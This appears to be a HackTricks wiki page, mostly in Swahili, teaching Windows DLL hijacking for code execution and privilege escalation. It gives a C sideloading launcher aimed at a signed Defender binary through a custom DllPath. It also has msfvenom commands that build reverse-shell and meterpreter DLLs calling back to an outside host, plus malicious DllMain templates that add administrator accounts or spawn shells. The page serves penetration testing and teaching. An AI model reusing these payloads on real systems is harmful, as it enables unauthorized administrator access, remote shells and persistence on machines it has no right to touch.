# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## Taarifa za Msingi

DLL Hijacking inahusisha kumfanya programu inayotambulika ipakie DLL mbaya. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, and Side-Loading**. Inatumiwa sana kwa ajili ya utekelezaji wa msimbo, kupata persistence, na, kwa rari, kuinua vibali. Licha ya kuzingatia escalation hapa, mbinu ya hijacking inabaki ile ile kulingana na lengo.

### Mbinu za Kawaida

Kuna mbinu kadhaa zinazotumika kwa DLL hijacking, kila moja ikiwa na ufanisi wake kulingana na mkakati wa programu wa kupakia DLL:

1. **DLL Replacement**: Kubadilisha DLL halali na moja mbaya, kwa hiari kutumia DLL Proxying ili kuhifadhi utendaji wa DLL asili.
2. **DLL Search Order Hijacking**: Kuweka DLL mbaya katika njia ya utafutaji kabambe ya DLL halali, ukitumia muundo wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL mbaya ambayo programu itahisi ni DLL iliyohitajika ambayo haipo.
4. **DLL Redirection**: Kurekebisha vigezo vya utafutaji kama %PATH% au faili .exe.manifest / .exe.local ili kuelekeza programu kwa DLL mbaya.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na toleo mbaya katika direktorio ya WinSxS, mbinu inayohusishwa mara nyingi na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL mbaya katika saraka inayodhibitiwa na mtumiaji pamoja na programu iliyo kopiwa, kufanana na mbinu za Binary Proxy Execution.

## Kupata Dll zilizokosekana

Njia ya kawaida ya kupata Dll zilizokosekana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **kuweka** **filter mbili zifuatazo**:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

naonyesha tu **File System Activity**:

![](<../../images/image (314).png>)

Ikiwa unatafuta **dll zilizokosekana kwa ujumla** unaacha hii ikikimbia kwa **sekunde kadhaa**.\
Ikiwa unatafuta **dll iliyokosekana ndani ya executable maalumu** unapaswa kuweka **filter nyingine kama "Process Name" "contains" "\<exec name>", kuendesha executable, na kusitisha kurekodi matukio**.

## Kutumia Dll Zilizokosekana

Ili kuinua vibali, nafasi bora tunayo ni kuwa na uwezo wa **kuandika dll ambayo mchakato wenye vibali ataijaribu kupakia** katika moja ya **mahali ambapo itaangaliwa**. Kwa hiyo, tunaweza **kuandika** dll katika **folda** ambapo **dll inatafutwa kabla** ya folda ambapo **dll asili** iko (hali isiyo ya kawaida), au tunaweza kuandika kwenye folda fulani ambapo dll itatafutwa na dll asili haipo katika folda yoyote.

### Dll Search Order

**Ndani ya** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kuona jinsi Dll zinavyopakuliwa kwa undani.**

Programu za Windows zinatafuta DLL kwa kufuata seti ya **njia za utafutaji zilizowekwa awali**, zikifuata mfuatano maalumu. Tatizo la DLL hijacking linapotokea ni pale ambapo DLL hatari imewekwa kimkakati katika moja ya saraka hizi, kuhakikisha inapakiwa kabla ya DLL halisi. Suluhisho la kuzuia hili ni kuhakikisha programu inatumia njia za absolute inaporejea kwa DLL zinazohitajika.

Unaweza kuona **mpangilio wa utafutaji wa DLL kwenye mifumo ya 32-bit** hapa chini:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Hilo ndilo mpangilio wa **default** wa utafutaji ukiwa na **SafeDllSearchMode** imewezeshwa. Wakati imezimwa saraka ya sasa inasonga hadi nafasi ya pili. Ili kuzima kipengele hiki, tengeneza thamani ya rejista **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uite 0 (default ni enabled).

Ikiwa [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) inaitwa na **LOAD_WITH_ALTERED_SEARCH_PATH** utafutaji unaanza katika saraka ya module ya executable ambayo **LoadLibraryEx** inapakia.

Mwisho, kumbuka kwamba **dll inaweza kupakiwa ukionyesha njia kamili badala ya jina tu**. Katika kesi hiyo dll hiyo **itatafutwa tu katika njia hiyo** (ikiwa dll ina dependencies, zitatafutwa kama zilipakiwa kwa jina tu).

Kuna njia nyingine za kubadilisha mpangilio wa utafutaji lakini sitazielezea hapa.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya juu ya kuathiri kwa uhakika njia ya utafutaji ya DLL ya mchakato mpya iliyoundwa ni kuweka shamba DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda mchakato kwa kutumia native APIs za ntdll. Kwa kutoa saraka inayodhibitiwa na mwizi hapa, mchakato lengwa ambao unatambua DLL iliyoinuliwa kwa jina (bila njia kamili na bila kutumia flag za safe loading) unaweza kulazimishwa kupakia DLL mbaya kutoka saraka hiyo.

Wazo kuu
- Jenga vigezo vya mchakato na RtlCreateProcessParametersEx na toa DllPath maalumu inayofanya pointi kwa folda yako unayotawala (mfano, saraka ambako dropper/unpacker yako iko).
- Unda mchakato na RtlCreateUserProcess. Wakati binary lengwa itapotatua DLL kwa jina, loader itatafuta DllPath iliyotolewa wakati wa utatuzi, kuwezesha sideloading inayotegemewa hata pale DLL mbaya haiko pamoja na EXE lengwa.

Vidokezo / vikwazo
- Hii inaathiri mchakato mtoto unaoundwa; ni tofauti na SetDllDirectory, ambayo inaathiri mchakato wa sasa pekee.
- Lengwa lazima aimport au kutumia LoadLibrary kwa DLL kwa jina (bila njia kamili na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na njia zilizo hardcoded absolute haziwezi kuibiwa. Forwarded exports na SxS zinaweza kubadilisha upendeleo.

Minimal C example (ntdll, wide strings, simplified error handling):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

Mbinu hii imeonekana katika mazingira halisi kuendesha minyororo ya sideloading yenye hatua nyingi: launcher wa awali hutoa DLL msaidizi, ambayo kisha huanzisha binary iliyotiwa saini na Microsoft, inayoweza kuibiwa, yenye DllPath maalum ili kulazimisha kupakia DLL ya mshambuliaji kutoka kwenye saraka ya staging.


#### Isipokuwa katika mpangilio wa utafutaji wa DLL (kulingana na nyaraka za Windows)

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Wakati a **DLL that shares its name with one already loaded in memory** inapotokea, mfumo hupitisha utafutaji wa kawaida. Badala yake, hufanya ukaguzi wa redirection na manifest kabla ya kurudi kwenye DLL iliyopo kwenye memory. **In this scenario, the system does not conduct a search for the DLL**.
- Katika matukio ambapo DLL inatambulika kama **known DLL** kwa toleo la sasa la Windows, mfumo utatumia toleo lake la known DLL, pamoja na DLL zake zote zinazotegemea, **forgoing the search process**. Kifunguo cha rejista **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** linaorodhesha DLL hizi zinazojulikana.
- Iwapo **DLL ina dependencies**, utafutaji wa DLL hizi tegemezi unafanywa kana kwamba zilielezwa tu kwa **module names**, bila kujali kama DLL ya awali ilitambulishwa kwa njia kamili.

### Kupandisha Vibali

**Mahitaji**:

- Tambua mchakato unaofanya kazi au utakaoanzishwa chini ya **different privileges** (horizontal or lateral movement), ambao **lacking a DLL**.
- Hakikisha kuna **write access** kwa **directory** yoyote ambamo **DLL** itatafutwa. Mahali hapa inaweza kuwa saraka ya executable au saraka ndani ya system path.

Ndio, mahitaji ni magumu kuyapata kwa kuwa **by default it's kind of weird to find a privileged executable missing a dll** na ni hata **more weird to have write permissions on a system path folder** (kwa chaguo la kawaida hutaweza). Hata hivyo, katika mazingira yaliyoratibiwa vibaya hii inawezekana.\
Katika tukio una bahati na unapata kuwa unakidhi mahitaji, unaweza angalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Hata kama **main goal of the project is bypass UAC**, unaweza kupata hapo **PoC** ya Dll hijaking kwa toleo la Windows ambayo unaweza kutumia (labda kwa kubadilisha njia ya folda ambapo una write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **angalia ruhusa za folda zote ndani ya PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kuangalia imports za executable na exports za dll kwa:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili kuhusu jinsi ya **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) itakagua ikiwa una ruhusa za kuandika kwenye folda yoyote ndani ya system PATH.\
Zana nyingine za kiotomatiki zinazovutia za kugundua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

Iwapo utapata senario inayoweza kutumiwa, moja ya mambo muhimu zaidi ili kui-exploit kwa mafanikio itakuwa **create a dll that exports at least all the functions the executable will import from it**. Hata hivyo, kumbuka kwamba Dll Hijacking inakuja muhimu ili [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) au kutoka[ **High Integrity to SYSTEM**](#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **how to create a valid dll** ndani ya utafiti huu wa dll hijacking ulioangazia dll hijacking kwa execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **next sectio**n unaweza kupata baadhi ya **basic dll codes** ambazo zinaweza kuwa muhimu kama **templates** au kuunda **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Kwa msingi, **Dll proxy** ni Dll inayoweza **execute your malicious code when loaded** lakini pia **expose** na **work** kama **exected** kwa **relaying all the calls to the real library**.

Kwa kutumia zana [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) unaweza kwa kweli **indicate an executable and select the library** unayotaka ku-proxify na **generate a proxified dll** au **indicate the Dll** na **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Unda mtumiaji (x86 sikuwahi kuona toleo la x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Yako mwenyewe

Zingatia kwamba katika matukio kadhaa Dll unayo-compile lazima **export several functions** ambazo zitapakiwa na victim process; ikiwa hizi functions hazipo, **binary won't be able to load** them na **exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Marejeo

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../banners/hacktricks-training.md}}
